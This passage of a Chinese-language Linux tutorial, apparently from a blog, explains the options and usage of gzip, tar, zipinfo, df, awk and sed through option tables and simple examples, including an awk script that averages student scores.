align=\"left\">参数长名</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">-c</td>\n<td align=\"left\">—stdout</td>\n<td align=\"left\">在标准输出上输出，保持原始文件</td>\n</tr>\n<tr>\n<td align=\"left\">-d</td>\n<td align=\"left\">—decompress</td>\n<td align=\"left\">解压缩</td>\n</tr>\n<tr>\n<td align=\"left\">-f</td>\n<td align=\"left\">—force</td>\n<td align=\"left\">强制覆盖输出文件并压缩链接</td>\n</tr>\n<tr>\n<td align=\"left\">-h</td>\n<td align=\"left\">—help</td>\n<td align=\"left\">显示帮助</td>\n</tr>\n<tr>\n<td align=\"left\">-k</td>\n<td align=\"left\">—keep</td>\n<td align=\"left\">保留（不删除）输入文件</td>\n</tr>\n<tr>\n<td align=\"left\">-l</td>\n<td align=\"left\">—list</td>\n<td align=\"left\">列出压缩文件的内容</td>\n</tr>\n<tr>\n<td align=\"left\">-L</td>\n<td align=\"left\">—license</td>\n<td align=\"left\">显示软件许可证</td>\n</tr>\n<tr>\n<td align=\"left\">-n</td>\n<td align=\"left\">—no-name</td>\n<td align=\"left\">不保存或恢复原始文件名称和时间戳</td>\n</tr>\n<tr>\n<td align=\"left\">-N</td>\n<td align=\"left\">—name</td>\n<td align=\"left\">保存或恢复原始文件名称和时间戳</td>\n</tr>\n<tr>\n<td align=\"left\">-q</td>\n<td align=\"left\">—quiet</td>\n<td align=\"left\">禁用所有警告，安静模式</td>\n</tr>\n<tr>\n<td align=\"left\">-r</td>\n<td align=\"left\">—recursive</td>\n<td align=\"left\">对目录启动递归操作</td>\n</tr>\n<tr>\n<td align=\"left\"></td>\n<td align=\"left\">—syncable</td>\n<td align=\"left\">制作对rsync友好的存档</td>\n</tr>\n<tr>\n<td align=\"left\">-S</td>\n<td align=\"left\">—suffix=SUF</td>\n<td align=\"left\">在压缩文件上使用后缀 SUF</td>\n</tr>\n<tr>\n<td align=\"left\"></td>\n<td align=\"left\">—synchronous</td>\n<td align=\"left\">同步输出（如果系统崩溃，则更安全，但是更慢）</td>\n</tr>\n<tr>\n<td align=\"left\">-t</td>\n<td align=\"left\">—test</td>\n<td align=\"left\">测试压缩文件的完整性</td>\n</tr>\n<tr>\n<td align=\"left\">-v</td>\n<td align=\"left\">—verbose</td>\n<td align=\"left\">详细输出执行过程</td>\n</tr>\n<tr>\n<td align=\"left\">-V</td>\n<td align=\"left\">—version</td>\n<td align=\"left\">显示版本号</td>\n</tr>\n<tr>\n<td align=\"left\">-1</td>\n<td align=\"left\">—fast</td>\n<td align=\"left\">更快的压缩速度</td>\n</tr>\n<tr>\n<td align=\"left\">-9</td>\n<td align=\"left\">—best</td>\n<td align=\"left\">最好的压缩率</td>\n</tr>\n</tbody></table>\n<p>示例 gzip -d * 解压缩 gzip -l * 查看压缩文件信息，但不解压缩文件。</p>\n<p>gzip -rv test test目录下所有文件进行gzip压缩。</p>\n<p>gzip -rd test test目录下所有文件进行解压缩</p>\n<h5 id=\"tar命令可以将多个文件归档到一个文件，或者从归档中还原出所有文件\"><a href=\"#tar命令可以将多个文件归档到一个文件，或者从归档中还原出所有文件\" class=\"headerlink\" title=\"tar命令可以将多个文件归档到一个文件，或者从归档中还原出所有文件\"></a>tar命令可以将多个文件归档到一个文件，或者从归档中还原出所有文件</h5><table>\n<thead>\n<tr>\n<th align=\"left\">选项参数</th>\n<th align=\"left\">长选项</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">-c</td>\n<td align=\"left\">—create</td>\n<td align=\"left\">创建一个新的归档文件</td>\n</tr>\n<tr>\n<td align=\"left\">-r</td>\n<td align=\"left\">—append</td>\n<td align=\"left\">往归档文件末尾追加文件</td>\n</tr>\n<tr>\n<td align=\"left\">-u</td>\n<td align=\"left\">—update</td>\n<td align=\"left\">将更新的文件更新到归档中</td>\n</tr>\n<tr>\n<td align=\"left\">-x</td>\n<td align=\"left\">—get, —extract</td>\n<td align=\"left\">将归档中解压文件</td>\n</tr>\n<tr>\n<td align=\"left\">-d</td>\n<td align=\"left\">—diff, —compare</td>\n<td align=\"left\">对归档和文件系统中的文件进行差异比较</td>\n</tr>\n<tr>\n<td align=\"left\"></td>\n<td align=\"left\">—delete</td>\n<td align=\"left\">从归档文件中删除指定文件</td>\n</tr>\n<tr>\n<td align=\"left\">-t</td>\n<td align=\"left\">—list</td>\n<td align=\"left\">查看归档文件中的内容列表</td>\n</tr>\n<tr>\n<td align=\"left\">-v</td>\n<td align=\"left\">—verbose</td>\n<td align=\"left\">显示执行过程</td>\n</tr>\n<tr>\n<td align=\"left\">-z</td>\n<td align=\"left\">—gzip</td>\n<td align=\"left\">使用gzip进行压缩</td>\n</tr>\n<tr>\n<td align=\"left\">-f</td>\n<td align=\"left\">—file</td>\n<td align=\"left\">指定备份文件名称</td>\n</tr>\n</tbody></table>\n<p>示例 tar -czvf test.tar.gz test/ 使用gzip进行压缩处理</p>\n<p>​         tar -zxvf test.tar.gz 把一个gzip压缩的归档文件进行解压缩。</p>\n<h4 id=\"六：linux查看压缩的zipinfo命令\"><a href=\"#六：linux查看压缩的zipinfo命令\" class=\"headerlink\" title=\"六：linux查看压缩的zipinfo命令\"></a>六：linux查看压缩的zipinfo命令</h4><table>\n<thead>\n<tr>\n<th align=\"left\">参数</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">-1</td>\n<td align=\"left\">只列出文件名，排除其他所有选项</td>\n</tr>\n<tr>\n<td align=\"left\">-2</td>\n<td align=\"left\">只列出文件，但可以运行[-h -t -z]选项</td>\n</tr>\n<tr>\n<td align=\"left\">-s</td>\n<td align=\"left\">类似Unix的<code>ls -l</code>的方式展示</td>\n</tr>\n<tr>\n<td align=\"left\">-m</td>\n<td align=\"left\">类似Unix的<code>ls -l</code>的方式展示，但会多列出一个压缩率</td>\n</tr>\n<tr>\n<td align=\"left\">-l</td>\n<td align=\"left\">类似<code>-m</code>，但会多列出文件的原始大小</td>\n</tr>\n<tr>\n<td align=\"left\">-v</td>\n<td align=\"left\">显示归档文件中每个文件的详细信息</td>\n</tr>\n<tr>\n<td align=\"left\">-h</td>\n<td align=\"left\">概览信息:归档文件名称，文件总大小和总文件数量</td>\n</tr>\n<tr>\n<td align=\"left\">-M</td>\n<td align=\"left\">类型Linux的<code>more</code>命令，每次显示一屏内容</td>\n</tr>\n<tr>\n<td align=\"left\">-t</td>\n<td align=\"left\">只显示总文件数，未压缩和压缩后的大小，以及压缩率</td>\n</tr>\n<tr>\n<td align=\"left\">-T</td>\n<td align=\"left\">以文件日期的循序排序显示</td>\n</tr>\n<tr>\n<td align=\"left\">-z</td>\n<td align=\"left\">打印压缩文件的注释</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">zipinfo [-12smlvhMtTz] file[.zip] [file(s) ...] [-x xfile(s) ...]</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>[OPTION]</code> 选项参数，可以指定多个选项参数</li>\n<li><code>[FILE]</code> 要压缩的文件路径，可以指定多个要压缩文件</li>\n</ul>\n<h4 id=\"七：Linux查看磁盘的df命令-disk-free\"><a href=\"#七：Linux查看磁盘的df命令-disk-free\" class=\"headerlink\" title=\"七：Linux查看磁盘的df命令  disk free\"></a>七：Linux查看磁盘的df命令  disk free</h4><table>\n<thead>\n<tr>\n<th align=\"left\">参数</th>\n<th align=\"left\">长参数</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">-a</td>\n<td align=\"left\">—all</td>\n<td align=\"left\">统计全部类型</td>\n</tr>\n<tr>\n<td align=\"left\">-B</td>\n<td align=\"left\">—block-size=SIZE</td>\n<td align=\"left\">改变显示的单位,如: -BM 以MB为单位打印磁盘容量</td>\n</tr>\n<tr>\n<td align=\"left\">-h</td>\n<td align=\"left\">—human-readable</td>\n<td align=\"left\">以易读的方式显示单位(以1024的n次方)</td>\n</tr>\n<tr>\n<td align=\"left\">-H</td>\n<td align=\"left\">—si</td>\n<td align=\"left\">以1000字节为单位换算</td>\n</tr>\n<tr>\n<td align=\"left\">-i</td>\n<td align=\"left\">—inodes</td>\n<td align=\"left\">列出索引节点信息而不是块使用情况</td>\n</tr>\n<tr>\n<td align=\"left\">-k</td>\n<td align=\"left\">—block-size</td>\n<td align=\"left\">指定block块的大小，如 1K</td>\n</tr>\n<tr>\n<td align=\"left\">-l</td>\n<td align=\"left\">—local</td>\n<td align=\"left\">限制只统计本地文件系统信息</td>\n</tr>\n<tr>\n<td align=\"left\"></td>\n<td align=\"left\">—no-sync</td>\n<td align=\"left\">在获取使用情况信息之前不调用同步(默认)</td>\n</tr>\n<tr>\n<td align=\"left\"></td>\n<td align=\"left\">—sync</td>\n<td align=\"left\">在获取使用情况信息之前调用同步</td>\n</tr>\n<tr>\n<td align=\"left\"></td>\n<td align=\"left\">—output[=FIELD_LIST]</td>\n<td align=\"left\">定义输出格式，默认使用的 FIELD_LIST，省略FIELD_LIST 则打印全部字段</td>\n</tr>\n<tr>\n<td align=\"left\">-P</td>\n<td align=\"left\">—portability</td>\n<td align=\"left\">使用POSIX的输出格式</td>\n</tr>\n<tr>\n<td align=\"left\"></td>\n<td align=\"left\">—total</td>\n<td align=\"left\"></td>\n</tr>\n<tr>\n<td align=\"left\">-t</td>\n<td align=\"left\">—type=TYPE</td>\n<td align=\"left\">指定要统计的文件类型</td>\n</tr>\n<tr>\n<td align=\"left\">-T</td>\n<td align=\"left\">—print-type</td>\n<td align=\"left\">显示文件类型</td>\n</tr>\n<tr>\n<td align=\"left\">-x</td>\n<td align=\"left\">—exclude-type=TYPE</td>\n<td align=\"left\">排除文件的类型</td>\n</tr>\n<tr>\n<td align=\"left\">-v</td>\n<td align=\"left\"></td>\n<td align=\"left\">(忽略)</td>\n</tr>\n<tr>\n<td align=\"left\"></td>\n<td align=\"left\">—help</td>\n<td align=\"left\">显示帮助</td>\n</tr>\n<tr>\n<td align=\"left\"></td>\n<td align=\"left\">—version</td>\n<td align=\"left\">显示版本信息</td>\n</tr>\n</tbody></table>\n<p><code>df</code>不加任何参数，默认会以千字节为单位进行信息展示。但这种方式对于我们来说并不直观</p>\n<p>-h human readable， -a 详细信息， df 路径 显示指定文件所在分区的磁盘情况</p>\n<p>使用<code>-B</code>参数，你可以指定要显示的单位<code>1K</code>、<code>1M</code>、<code>1G</code>、<code>1T</code>、<code>1P</code>分别以<code>KB</code>、<code>MB</code>、<code>GB</code>、<code>TB</code>、<code>PB</code>为单位显示信息 可以自己指定换算单位，下面的两行分别以<code>1000</code>和<code>1024</code>为换算单位</p>\n<p><code>-T</code>参数，显示文件系统的类型信息，<code>-t</code>参数，可以指定要统计的文件类型df -Tht ext4</p>\n<h4 id=\"八：awk命令-可以执行的伪c语言\"><a href=\"#八：awk命令-可以执行的伪c语言\" class=\"headerlink\" title=\"八：awk命令 可以执行的伪c语言\"></a>八：awk命令 可以执行的伪c语言</h4><h5 id=\"awk-参数-‘开始代码块-主体代码块-结束代码块’-待处理文件\"><a href=\"#awk-参数-‘开始代码块-主体代码块-结束代码块’-待处理文件\" class=\"headerlink\" title=\"awk 参数 ‘开始代码块 主体代码块 结束代码块’ 待处理文件\"></a>awk 参数 ‘开始代码块 主体代码块 结束代码块’ 待处理文件</h5><p>示例：awk ‘BEGIN { print “Hello World” }’ BEGIN代码块<code>来输出</code>Hello World</p>\n<p>awk ‘{ print }’ hello.txt awk输出</p>\n<p>echo “Hello World” | awk ‘{ print }’ 可以通过Linux里的管道<code>|</code>命令，将要处理的内容通过<code>|</code>管道发送给后面的<code>awk</code>命令来处理</p>\n<p>awk ‘BEGIN {print “-==========-“} { print } END {print “-==========-“}’ hello.txt </p>\n<p>awk ‘{print $1 $2 $3 $4 $5 }’ scores.txt awk会按照空格，将一行数据分成多列，对于其中的每一列数据，awk都有一个变量与值对应。 第一列是<code>$1</code>，第二列是<code>$2</code></p>\n<p>awk ‘{print $1,$2,$3,$4,$5 }’ scores.txt 输出列间隙</p>\n<p>awk ‘{print $1,”\\t”,$2,”\\t”,$3,”\\t”,$4,”\\t”,$5 }’ scores.txt 控制对齐列</p>\n<p>awk ‘{printf “%s\\t%s\\t%s\\t%s\\t%s\\n”,$1,$2,$3,$4,$5 }’ scores.txt <code>printf</code>函数结合<code>\\t</code>来完成这个任务</p>\n<p>awk ‘$2==”赵六” { print }’ scores.txt 模式匹配</p>\n<p>awk ‘$2==”姓名” || $2==”赵六” { print }’ scores.txt  ||或者</p>\n<p>脚本文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/bash</span><br><span class=\"line\">awk  &#x27;BEGIN &#123;</span><br><span class=\"line\">  chinese=0</span><br><span class=\"line\">  math=0</span><br><span class=\"line\">  english=0</span><br><span class=\"line\">  count = 0</span><br><span class=\"line\">  print &quot;学号\\t姓名\\t语文\\t数学\\t英语&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$2!=&quot;姓名&quot;  &#123;</span><br><span class=\"line\">  chinese += $3</span><br><span class=\"line\">  math += $4</span><br><span class=\"line\">  english += $5</span><br><span class=\"line\">  count += 1</span><br><span class=\"line\">  print $1,&quot;\\t&quot;,$2,&quot;\\t&quot;,$3,&quot;\\t&quot;,$4,&quot;\\t&quot;,$5</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">END &#123;</span><br><span class=\"line\">  print &quot;-------------------------------------------&quot;</span><br><span class=\"line\">  print &quot;平均分&quot;, &quot;\\t&quot;, &quot;共&quot; count &quot;人&quot;, &quot;\\t&quot; , chinese/count , &quot;\\t&quot; , math/count , &quot;\\t&quot; , english/count</span><br><span class=\"line\">&#125;&#x27; scores.txt</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th align=\"left\">内置变量</th>\n<th align=\"left\">英文全称</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">ARGC</td>\n<td align=\"left\">arguments count</td>\n<td align=\"left\">命令行参数数量</td>\n</tr>\n<tr>\n<td align=\"left\">ARGV</td>\n<td align=\"left\">arguments value</td>\n<td align=\"left\">命令行参数数组</td>\n</tr>\n<tr>\n<td align=\"left\">CONVFMT</td>\n<td align=\"left\">convert format</td>\n<td align=\"left\">数字转换为字符串的内部转换值，初始值为 <code>%.6g</code></td>\n</tr>\n<tr>\n<td align=\"left\">ENVIRON</td>\n<td align=\"left\">enviroment</td>\n<td align=\"left\">环境变量构成的索引数组，<code>ENVIRON[var] = value</code>。</td>\n</tr>\n<tr>\n<td align=\"left\">FILENAME</td>\n<td align=\"left\">file name</td>\n<td align=\"left\">当前输入文件的文件名</td>\n</tr>\n<tr>\n<td align=\"left\">FNR</td>\n<td align=\"left\">file number of records</td>\n<td align=\"left\">当前文件的当前行记录值</td>\n</tr>\n<tr>\n<td align=\"left\">FS</td>\n<td align=\"left\">field separator</td>\n<td align=\"left\">字段分割符<code>默认是空格</code></td>\n</tr>\n<tr>\n<td align=\"left\">NF</td>\n<td align=\"left\">number of fields</td>\n<td align=\"left\">当前记录的分段数（列数）</td>\n</tr>\n<tr>\n<td align=\"left\">NR</td>\n<td align=\"left\">total number of records</td>\n<td align=\"left\">已读出记录的当前行数</td>\n</tr>\n<tr>\n<td align=\"left\">OFMT</td>\n<td align=\"left\">output format</td>\n<td align=\"left\">数字的输出格式（默认为 %.6g ）</td>\n</tr>\n<tr>\n<td align=\"left\">OFS</td>\n<td align=\"left\">output field separator</td>\n<td align=\"left\">输出字段分隔符，默认和输入字段分隔符一致（空格）</td>\n</tr>\n<tr>\n<td align=\"left\">ORS</td>\n<td align=\"left\">output record separator</td>\n<td align=\"left\">输出记录分隔符，默认是换行符<code>\\n</code></td>\n</tr>\n<tr>\n<td align=\"left\">RLENGTH</td>\n<td align=\"left\"></td>\n<td align=\"left\">match函数匹配的字符串长度</td>\n</tr>\n<tr>\n<td align=\"left\">RS</td>\n<td align=\"left\">[input] record separator</td>\n<td align=\"left\">输入记录分隔符，默认是换行符<code>\\n</code></td>\n</tr>\n<tr>\n<td align=\"left\">RSTART</td>\n<td align=\"left\"></td>\n<td align=\"left\">match函数匹配的字符串的起始位置</td>\n</tr>\n<tr>\n<td align=\"left\">SUBSEP</td>\n<td align=\"left\"></td>\n<td align=\"left\">构建多个数组下边，初始值<code>\\034</code></td>\n</tr>\n</tbody></table>\n<h3 id=\"算术函数\"><a href=\"#算术函数\" class=\"headerlink\" title=\"算术函数\"></a>算术函数</h3><table>\n<thead>\n<tr>\n<th align=\"left\">函数</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">int(x)</td>\n<td align=\"left\">对x取整数</td>\n</tr>\n<tr>\n<td align=\"left\">sqrt(x)</td>\n<td align=\"left\">求x的平方根</td>\n</tr>\n<tr>\n<td align=\"left\">exp(x)</td>\n<td align=\"left\">求e^x</td>\n</tr>\n<tr>\n<td align=\"left\">log(x)</td>\n<td align=\"left\">求x的对数</td>\n</tr>\n<tr>\n<td align=\"left\">sin(x)</td>\n<td align=\"left\">求x的正弦值</td>\n</tr>\n<tr>\n<td align=\"left\">cos(x)</td>\n<td align=\"left\">求x的余弦值</td>\n</tr>\n<tr>\n<td align=\"left\">atan2(y,x)</td>\n<td align=\"left\">求x的反正切</td>\n</tr>\n<tr>\n<td align=\"left\">rand()</td>\n<td align=\"left\">0-1之前的随机数</td>\n</tr>\n<tr>\n<td align=\"left\">srand(expr)</td>\n<td align=\"left\">设置随机种子</td>\n</tr>\n</tbody></table>\n<h3 id=\"字符串函数\"><a href=\"#字符串函数\" class=\"headerlink\" title=\"字符串函数\"></a>字符串函数</h3><table>\n<thead>\n<tr>\n<th align=\"left\">函数</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">gsub(r,s,t) gsub(r,s)</td>\n<td align=\"left\">全局搜索子字符串，t中每个匹配正则表达式r的值都用s来替代，最后函数返回替换的次数。如果t未指定，则使用$0替代。</td>\n</tr>\n<tr>\n<td align=\"left\">index(s,t)</td>\n<td align=\"left\">如果t是s的子字符串，返回在s中出现的第一个t的位置，否则返回0，s中第一个字符的位置记为1</td>\n</tr>\n<tr>\n<td align=\"left\">length(s)</td>\n<td align=\"left\">返回字符串或数组长度</td>\n</tr>\n<tr>\n<td align=\"left\">match(s,r)</td>\n<td align=\"left\">返回s中最长匹配r正则的子字符串，并会把RSTART和RLENGTH值设置为匹配的子字符串的起始位置和长度</td>\n</tr>\n<tr>\n<td align=\"left\">split(s,A,r) split(s,A)</td>\n<td align=\"left\">使用r正则对s进行分割，分割后的元素放入A数组中，并返回分割成的元素的数量</td>\n</tr>\n<tr>\n<td align=\"left\">sprintf(format, expr-list)</td>\n<td align=\"left\">根据format格式返回一个字符串，</td>\n</tr>\n<tr>\n<td align=\"left\">sub(r,s,t) sub(r,s)</td>\n<td align=\"left\">只搜索一次子字符串，功能类似于gsub</td>\n</tr>\n<tr>\n<td align=\"left\">substr(s,i,n) substr(s,i)</td>\n<td align=\"left\">返回新子字符串，内容为原s中起始索引为i，长度为n的子字符串，无没有提供n，则返回起始索引为i一直到源字符串末尾的子字符串</td>\n</tr>\n<tr>\n<td align=\"left\">tolower(s)</td>\n<td align=\"left\">返回新字符串，将s中的字母全转为小写</td>\n</tr>\n<tr>\n<td align=\"left\">toupper(s)</td>\n<td align=\"left\">返回新字符串，将s中的字母全转为大写</td>\n</tr>\n</tbody></table>\n<h3 id=\"时间日期函数\"><a href=\"#时间日期函数\" class=\"headerlink\" title=\"时间日期函数\"></a>时间日期函数</h3><table>\n<thead>\n<tr>\n<th align=\"left\">函数</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">mktime(specification)</td>\n<td align=\"left\">用指定格式创建一个当前时间的时间戳<code>YYYY-MM-DD HH:MM:SS</code></td>\n</tr>\n<tr>\n<td align=\"left\">strftime([format [, timestamp [, utc ]]])</td>\n<td align=\"left\">使用指定格式，对给定时间戳构建时间字符串</td>\n</tr>\n<tr>\n<td align=\"left\">systime()</td>\n<td align=\"left\">返回系统当前时间（秒数），从<code>1970-01-01 00:00:00 UTC</code>至今</td>\n</tr>\n</tbody></table>\n<p>输入函数，通过<code>getline</code>实现。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 直接读取到$0中</span><br><span class=\"line\">getline</span><br><span class=\"line\"># 从file路径中读取到$0</span><br><span class=\"line\">getline &lt; file</span><br><span class=\"line\"># 从file文件读取到var变量中</span><br><span class=\"line\">getline var &lt; file</span><br><span class=\"line\"># 通过管道将command命令结果读取到$0</span><br><span class=\"line\">command | getline</span><br><span class=\"line\"># 通过管道将command命令结果读取到var</span><br><span class=\"line\">command | getline var</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//自定义函数</span><br><span class=\"line\">function 函数名(参数)&#123;</span><br><span class=\"line\">  return 返回值</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"控制语句\"><a href=\"#控制语句\" class=\"headerlink\" title=\"控制语句\"></a>控制语句</h6><p>awk支持四种主流的逻辑控制语句：<code>if-else</code>、<code>while</code>、<code>do-while</code>和<code>for</code>。如果你有<code>C/C++</code>，<code>JavaScript</code>或者<code>Java</code>这些主流编程语言。那这些逻辑控制语句你也就已经掌握了。当然为了照顾零基础的阅读者，我还是有必要列举下这几种控制语句的常用场景。</p>\n<p>示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">awk &#x27;BEGIN &#123;</span><br><span class=\"line\">  score=80</span><br><span class=\"line\">  if(score&gt;=60)</span><br><span class=\"line\">    print &quot;合格&quot;</span><br><span class=\"line\">  else</span><br><span class=\"line\">    print &quot;不合格&quot;</span><br><span class=\"line\">&#125;&#x27;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">awk &#x27;BEGIN &#123;  nums[0] = 100  nums[1] = 200  nums[2] = 300  nums[3] = 400  for(i=0;i&lt;length(nums);i++)    print nums[i]&#125;&#x27;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">awk &#x27;BEGIN &#123;  nums[0] = 100  nums[1] = 200  nums[2] = 300  nums[3] = 400  for(key in nums)      print nums[key]&#125;&#x27;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">awk &#x27;BEGIN &#123;  i = 1  while(i&lt;10)&#123;      print i      i++  &#125;&#125;&#x27;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">awk &#x27;BEGIN &#123;  i = 1  do&#123;      print i      i++  &#125;while(i&lt;10)&#125;&#x27;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">awk &#x27;BEGIN &#123;  i = 1  do&#123;      print i      i++      if(i==10) break  &#125;while(1==1)&#125;&#x27;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">exit(返回码)</span><br></pre></td></tr></table></figure>\n\n<p>返回码如果设置为0表示正常退出，非零表示异常退出</p>\n<h4 id=\"九：sed命令\"><a href=\"#九：sed命令\" class=\"headerlink\" title=\"九：sed命令\"></a>九：sed命令</h4><h5 id=\"替换操作会用到script中的s命令，s命令的语法格式如下：\"><a href=\"#替换操作会用到script中的s命令，s命令的语法格式如下：\" class=\"headerlink\" title=\"替换操作会用到script中的s命令，s命令的语法格式如下：\"></a>替换操作会用到script中的<code>s命令</code>，<code>s命令</code>的语法格式如下：</h5><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">s/regexp/replacement/[flags]</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>regexp</code>是要查找匹配的正则</li>\n<li><code>replacement</code>是替换内容</li>\n<li><code>[flags]</code>是可选的，用来添加一些额外标记参数</li>\n</ul>\n<p>示例 假设我们有一个文件<code>hello.txt</code>，这个文件里的内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Hello World!</span><br></pre></td></tr></table></figure>\n\n<p>我们想要把后面的<code>World</code>替换成<code>Sed</code>。我们可以这样来写：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sed &#x27;s/World/Sed/&#x27; hello.txt</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>&#39;s/World/Sed/&#39;</code>就是<code>[SCRIPT]</code>脚本命名，这里用的是<code>s命令</code></li>\n<li>s命令后面用三根<code>/</code>斜杠分了两个区域，<code>World</code>是要查找的字符，<code>Sed</code>是替换后的字符。</li>\n<li><code>hello.txt</code>是要sed要处理的文件路径。</li>\n<li>最后处理完的结果会显示到标准输出，也就是屏幕上。</li>\n</ul>\n<p>sed ‘s/World/Sed/‘ hello.txt &gt; result.txt 写入到result.txt</p>\n<p> 示例2</p>\n<p>sed本身也有写入文件的操作,通过<code>w</code>命令后面跟随要写出结果的文件路径即可。当然别忘了w后面要至少留一个空格。</p>\n<p>sed ‘s/World/Sed/w result2.txt’ hello.txt sed会往屏幕和<code>result2.txt</code>两个地方同时输出内容</p>\n<p>示例3</p>\n<p>sed -i ‘s/World/Sed/‘ hello.txt 将本次处理的结果直接写入到原文件中。利用<code>[options]</code>部分的<code>-i</code>选项，当然这个操作一旦执行，原文件的内容就会被修改掉</p>\n<p>示例4</p>\n<p>sed ‘s/t/T/g’ story.txt 全局替换表示所有的都替换</p>\n<p>示例5</p>\n<p>sed ‘2,3 s/t/T/g’ story.txt <code>2,3</code>就是指定了要处理的范围</p>\n<h5 id=\"其他命令\"><a href=\"#其他命令\" class=\"headerlink\" title=\"其他命令\"></a>其他命令</h5><ul>\n<li><p><code>a\\新追加内容</code> 也可以写成<code>a 新追加内容</code>：这个命令是<code>append</code>用来在匹配位置后方追加内容。</p>\n</li>\n<li><p><code>i\\新插入内容</code> 也可以写成<code>i 新插入内容</code>：这个命令是<code>insert</code>用来往匹配位置前面插入内容。</p>\n</li>\n<li><p><code>c\\新修改内容</code> 也可以写成<code>c 新修改内容</code>：这个命令是<code>change</code>用来修改匹配位置的内容。</p>\n</li>\n<li><p><code>d</code>这个命令是<code>delete</code>用来删除匹配内容</p>\n</li>\n<li><p>下面的例子让<code>2-3行</code>后方分别<code>append</code>追加一行<code>----</code></p>\n</li>\n<li><p>```undefined<br>sed ‘2,3 a —-‘ story.txt# 等价于sed ‘2,3 a-—‘ story.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">sed &#x27;2,3 d&#x27; story.txt 删除第2-3行的内容</span><br><span class=\"line\"></span><br><span class=\"line\">##### 其他</span><br><span class=\"line\"></span><br><span class=\"line\">- `h`命令将当前`pattern space`中的内容替换掉`hold space`中的老内容。</span><br><span class=\"line\">- `g`命令的操作和`h`正好相反，从`hold space`中取出内容放入`pattern space`</span><br><span class=\"line\"></span><br><span class=\"line\">sed -n &#x27;2p&#x27; story.txt `-n`，`--quiet`和`--silent`：这三个是等价的选项，启用后只有在命令中主动用`p`命令输出的匹配行才会输出</span><br><span class=\"line\"></span><br><span class=\"line\">sed --debug -e &#x27;s/^t/T/; 2d; 4d&#x27; story.txt `--debug`可用于调试查看`sed`的每次循环的执行过程，这对于分析`sed`非常有帮助</span><br><span class=\"line\"></span><br><span class=\"line\">| 命令                           | 说明                                                         |</span><br><span class=\"line\">| :----------------------------- | :----------------------------------------------------------- |</span><br><span class=\"line\">| `p`                            | 打印模式空间                                                 |</span><br><span class=\"line\">| `q[exit-code]`或`Q[exit-code]` | 退出sed程序，exit-code可以设置退出状态码                     |</span><br><span class=\"line\">| `w filename`                   | 将模式空间内容写入`filename`路径指定的文件                   |</span><br><span class=\"line\">| `W filename`                   | 将模式空间部分内容写入`filename`路径指定的文件，只写出遇到第一个换行符就停止，所以只输出1行内容。 |</span><br><span class=\"line\">| `x`                            | 交换模式空间和保持空间里的内容。                             |</span><br><span class=\"line\">| `g`                            | 使用保持空间中的内容替换模式空间的内容(模式空间原来的内容会被清除) |</span><br><span class=\"line\">| `G`                            | 在模式空间中追加以个新行，之后把保持空间的内容添加到模式空间(和`g`唯一的区别是会保留原来的内容) |</span><br><span class=\"line\">| `h`                            | 使用模式空间中的内容替换保持空间中的内容(和g命令相反)        |</span><br><span class=\"line\">| `H`                            | 在保持空间中追加以个新行，之后把模式空间的内容添加到保持空间(和`G`操作相反) |</span><br><span class=\"line\"></span><br><span class=\"line\">p命令的全称是`print`，是用来打印当前模式空间的内容</span><br><span class=\"line\"></span><br><span class=\"line\">sed --debug -e &#x27;p&#x27; story.txt</span><br><span class=\"line\"></span><br><span class=\"line\">利用q命令，在执行两条语句后，退出sed。</span><br><span class=\"line\"></span><br><span class=\"line\">```undefined</span><br><span class=\"line\">sed -e &#x27;2q&#x27; story.txt</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p><code>q</code>命令可以携带一个退出码<code>exit-code</code>，用来表明本次是否为异常退出。 退出后，退出码<code>exit-code</code>的值可以用<code>$?</code>查询到。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sed -e &#x27;q2&#x27; 